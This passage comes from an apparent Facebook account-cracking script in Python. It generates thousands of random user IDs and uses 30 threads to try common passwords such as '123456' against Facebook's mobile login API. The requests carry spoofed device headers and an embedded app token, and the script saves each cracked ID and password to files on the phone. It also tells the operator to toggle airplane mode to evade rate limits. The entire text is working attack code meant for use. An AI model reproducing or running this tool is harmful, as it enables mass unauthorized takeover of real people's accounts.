    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login3,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()

def __Old3__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login4,uid)            
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()

def login1(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mALi\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ALi-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login2(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mALi\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ALi-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ALi-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login3(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mALi\33[38;5;37m-\x1b[38;5;46mB3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/Ali-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAli\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/Ali-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login4(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMEHEDI\33[38;5;37m-\x1b[38;5;46mS4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ALi-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ALi-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
main()
